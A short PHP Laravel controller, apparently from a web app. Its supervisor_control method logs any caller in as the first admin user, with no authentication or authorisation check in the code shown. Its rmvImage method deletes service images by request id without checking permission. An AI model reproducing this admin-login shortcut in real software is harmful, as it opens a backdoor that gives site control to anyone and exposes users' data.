<?php

namespace App\Http\Controllers;

use App\User;
use App\Models\Service_image;
use Auth;
use Session;
use Illuminate\Http\Request;

class ajaxController extends Controller
{

    public function supervisor_control(Request $request)
    {
        $user = User::whereUserType('admin')->first();
        Auth::login($user);
        return redirect()->route('admin_home');
    }

    public function rmvImage(Request $request)
    {
        $data = Service_image::find($request->id);
        if (!isset($data)) return 'err';

        $count = Service_image::where('service_id', $data->service_id)->count();
        if ($count <= 1) return 'err';

        $data->delete();
        return 'success';
    }
}
